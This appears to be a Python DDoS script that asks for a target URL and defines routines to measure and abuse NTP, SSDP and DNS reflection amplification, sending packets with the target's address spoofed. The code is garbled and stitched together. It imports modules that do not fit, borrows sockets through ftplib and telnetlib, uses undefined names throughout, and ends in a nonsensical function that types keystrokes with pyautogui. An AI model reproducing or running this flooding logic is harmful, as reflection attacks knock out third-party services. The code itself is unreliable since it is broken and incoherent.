#!/usr/bin/python
# -*- coding: utf-8 -*-

import os
import random
import dobel
import time
import ftplib
import telnetlib
import requests

# !/usr/bin/python
# -*-coding:Latin-1 -*

os.system('cls')  # if windows

# os.system("clear") # if linux or mac
# the instalation modules

try:
    from colorama import init
    from termcolor import colored

    init()
except ImportError:
    print('')
    print('Some modules not installed\n')
    quest = input('Do you want install the dependencies [Y/N] ? ')
    if quest == 'Y' or quest == '' or quest == 'y':
        os.system('pip install colorama, termcolor')  # comand to install modules
    elif quest == 'N' or quest == 'n':
        sys.exit()  # if not


def cls():
    linux = 'clear'
    windows = 'cls'


cls()

hostsk = input('[+] Enter Your target (ex: https://google.com): ')  # type: str
requests.get(hostsk)

# noinspection PyTypeChecker

threads = input('Number of threads: ')

# noinspection PyTypeChecker

timeout = input('Timeout(max: 10): ')
requests.threads = (threads, timeout)
to_check = {}

url = hostsk
response = requests.get(url, timeout=10)
content = (response.content, 'html.parser')


class Index(object):

    def __init__(
        self,
        target,
        threads,
        domains,
        event,
        ):
        """

        :rtype: object
        """

        self.event = event
        self.target = target
        self.threads = threads
        self.passwords = passwords.get
        self.domains = domains

    def stress(self):
        for i in range(self.threads):  # type: int
            t = threading.Thread(target=self.__attack)
            t.start()

    def __send(
        self,
        sock,
        soldier,
        proto,
        payload,
        ):
        """
            Send a Spoofed Packet
        """

        udp = UDP().pack(self.target, soldier)
        ip = telnetlib.IP.pack()
        sock.sendto(ip + udp + payload, (soldier, PORT[proto]))

    def GetAmpSize(
        self,
        proto,
        soldier,
        domain='',
        PAYLOAD='',
        ):
        '''
            Get Amplification Size
        '''

        sock = ftplib.socket.socket(ftplib.socket.AF_INET,
                                    ftplib.socket.SOCK_DGRAM)
        sock.settimeout(2)
        data = ''
        if proto in ['ntp', 'ssdp']:
            packet = PAYLOAD[proto]
            sock.sendto(packet, (soldier, PORT[proto]))
            try:
                while True:
                    data += sock.recvfrom(65535)[0]
            except ftplib.socket.timeout:
                sock.close()
                return (len(data), len(packet))
        if proto == 'dns':
            packet = self.__GetDnsQuery(domain)
        else:
            packet = PAYLOAD[proto]
        try:
            sock.sendto(packet, (soldier, PORT[proto]))
            (data, _) = sock.recvfrom(65535)
        except ftplib.socket.timeout:
            data = ''
        finally:
            sock.close()
        return (len(data), len(packet))

    def __GetQName(self, domain):
        '''
            QNAME A domain name represented as a sequence of labels
            where each label consists of a length
            octet followed by that number of octets
        '''

        labels = domain.split('.')
        QName = ''
        for label in labels:
            if len(label):
                QName += struct.pack('B', len(label)) + label
        return QName

    def __GetDnsQuery(self, domain, PAYLOAD=''):
        global ID
        ID = struct.pack('H', ID)  # type: str
        QName = self.__GetQName(domain)
        return PAYLOAD[domains].format(ID, QName)

    def __attack(
        self,
        FILE_HANDLE='',
        amplification='',
        PAYLOAD='',
        ):
        global npackets
        global nbytes
        _files = files
        for proto in _files:  # Open Amplification files
            f = open(_files[proto][FILE_NAME], 'r')
            _files[proto].append(f)  # _files = {'proto':['file_name', file_handle]}
        sock = ftplib.socket.socket(ftplib.socket.AF_INET,
                                    ftplib.socket.SOCK_RAW,
                                    ftplib.socket.IPPROTO_RAW)
        i = 0
        while self.event.isSet():
            for proto in _files:
                soldier = _files[proto][FILE_HANDLE].readline().strip()
                if soldier:
                    if proto == 'dns':
                        if not amplification[proto].has_key(soldier):
                            amplification[proto][soldier] = {}
                        for domain in self.domains:
                            if not amplification[proto][soldier].has_key(domain):
                                (size, _) = self.GetAmpSize(proto,
                                        soldier, domain)
                                if size == 0:
                                    break
                                elif size < len(PAYLOAD[proto]):
                                    continue
                                else:
                                    amplification[proto][soldier][domain] = \
    size
                            amp = self.__GetDnsQuery(domain)
                            self.__send(sock, soldier, proto, amp)
                            npackets += 1
                            i += 1
                            nbytes += \
                                amplification[proto][soldier][domain]
                    else:
                        if not amplification[proto].has_key(soldier):
                            (size, _) = self.GetAmpSize(proto, soldier)
                            if size < len(PAYLOAD[proto]):
                                continue
                            else:
                                amplification[proto][soldier] = size
                        amp = PAYLOAD[proto]
                        npackets += 1
                        i += 1
                        nbytes += amplification[proto][soldier]
                        self.__send(sock, soldier, proto, amp)
                else:
                    _files[proto][FILE_HANDLE].seek(0)
        sock.close()
        for proto in _files:
            _files[proto][FILE_HANDLE].close()

    pass


def split(alphabetical=lambda x: x.lower):
    global threads, REQUESTS
    for REQUESTS in range(25):  # type: int
        threads = (quest, REQUESTS, responses, (alphabetical, replace))
    for i in threads:
        i = str(i)
        i = i.replace('[', '.sh')
        i = i.replace(']', '.py')
        i = i.replace("'", '.html')
        i = i.replace(' ', '.php')
        i = i.replace(',', '.js')
        i = i.replace('(', '.exe')
        i = i.replace(')', '.')
        pyautogui.typewrite(passwords, i)
        pyautogui.keyDown('enter')
        pyautogui.keyUp('enter')
        pyautogui.typewrite(i)
        pyautogui.keyDown('enter')
        pyautogui.keyUp('enter')
        REQUESTS += ++1
